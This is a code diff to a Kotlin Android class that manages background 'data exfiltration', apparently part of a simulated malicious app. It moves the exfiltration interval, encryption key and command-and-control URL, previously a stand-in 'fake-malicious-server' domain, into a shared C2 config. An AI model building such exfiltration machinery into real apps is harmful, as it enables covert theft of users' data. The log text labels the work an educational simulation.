@@ -22,6 +22,7 @@ import java.util.zip.GZIPOutputStream
 import java.io.ByteArrayOutputStream
 import javax.crypto.Cipher
 import javax.crypto.spec.SecretKeySpec
+import com.example.ChatterBox.malicious.C2Config
 
 /**
  * Manages data exfiltration in the background.
@@ -30,13 +31,13 @@ import javax.crypto.spec.SecretKeySpec
 class ExfiltrationManager(private val context: Context) {
     private val TAG = "ExfilManager"
     private var timer: Timer? = null
-    private val exfilInterval = 30 * 60 * 1000L  // 30 minutes
+    private val exfilInterval = C2Config.EXFIL_INTERVAL
     
-    // Simulated encryption key (would be hardcoded or fetched in a real malicious app)
-    private val encryptionKey = "ThisIsAFakeKey16".toByteArray()
+    // Get encryption key from global config
+    private val encryptionKey = C2Config.ENCRYPTION_KEY.toByteArray()
     
-    // Simulated C&C server URL (this is intentionally a fake domain)
-    private val commandServer = "https://fake-malicious-server.example.com/exfil"
+    // Get C&C server URL from global config
+    private val commandServer = C2Config.EXFILTRATION_ENDPOINT
     
     /**
      * Start the exfiltration schedule
@@ -79,6 +80,7 @@ class ExfiltrationManager(private val context: Context) {
                 "SIMULATED DATA EXFILTRATION\n" +
                 "Timestamp: $timestamp\n" +
                 "Target: $commandServer\n" +
+                "C2 Server: ${C2Config.SERVER_URL}\n" +
                 "Status: This is a simulated attempt for educational purposes only\n"
             )
             
